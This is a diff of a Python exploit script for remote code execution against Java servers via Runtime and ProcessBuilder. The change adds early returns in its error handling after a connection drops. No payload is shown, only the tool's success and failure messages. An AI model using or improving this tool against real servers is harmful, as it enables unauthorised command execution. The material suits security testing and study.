@@ -193,7 +193,7 @@ def runtime_rce(cmd, target):
         print("[!] Error: {}".format(e))
         print("[!] The connection was dropped/timed out. This might mean the server is either no vulnerable or blacklisted java.lang.Runtime")
         r = None
-
+        return 
     if "java.lang.Runtime cannot be cast to java.lang.String" in str(r.content):
         print("[!] Exploit succeeded")
     return r
@@ -224,6 +224,7 @@ def process_builder_rce(cmd, target):
         print("[!] Error: {}".format(e))
         print("[!] The connection was dropped/timed out. This might mean the server is either no vulnerable or blacklisted java.lang.ProcessBuilder")
         r = None
+        return
     if "java.lang.ProcessBuilder cannot be cast to java.lang.String" in str(r.content):
         print("[!] Exploit succeeded")
     return r
